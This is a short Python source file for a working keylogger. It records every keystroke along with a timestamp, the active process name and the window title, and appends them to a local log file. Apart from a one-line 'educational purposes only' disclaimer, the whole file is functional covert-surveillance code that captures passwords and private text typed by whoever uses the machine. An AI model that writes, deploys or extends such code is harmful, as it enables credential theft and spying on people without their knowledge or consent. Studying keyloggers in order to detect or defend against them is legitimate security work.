"""
keylog_advanced.py - Advanced keylogger with timestamps, active process name,
and window title logging.

For educational purposes only. Ensure compliance with local laws before use.
"""

import os
import subprocess
from datetime import datetime

import psutil
from pynput import keyboard

LOG_FILE = os.getenv("KEYLOG_FILE", "keylog.txt")


def get_active_process() -> str:
    try:
        pid = int(subprocess.check_output(
            ["xdotool", "getactivewindow", "getwindowpid"],
            stderr=subprocess.DEVNULL,
        ).strip())
        return psutil.Process(pid).name()
    except Exception:
        return "Unknown"


def get_window_title() -> str:
    try:
        return subprocess.check_output(
            ["xdotool", "getactivewindow", "getwindowname"],
            stderr=subprocess.DEVNULL,
        ).decode().strip()
    except Exception:
        return "Unknown"


def on_press(key: keyboard.Key | keyboard.KeyCode) -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    process_name = get_active_process()
    window_title = get_window_title()

    try:
        char = key.char  # type: ignore[union-attr]
    except AttributeError:
        char = f"[{key.name}]"  # type: ignore[union-attr]

    entry = f"{timestamp} [{process_name}] [{window_title}] Key: {char}\n"
    with open(LOG_FILE, "a") as f:
        f.write(entry)


def main() -> None:
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            pass


if __name__ == "__main__":
    main()
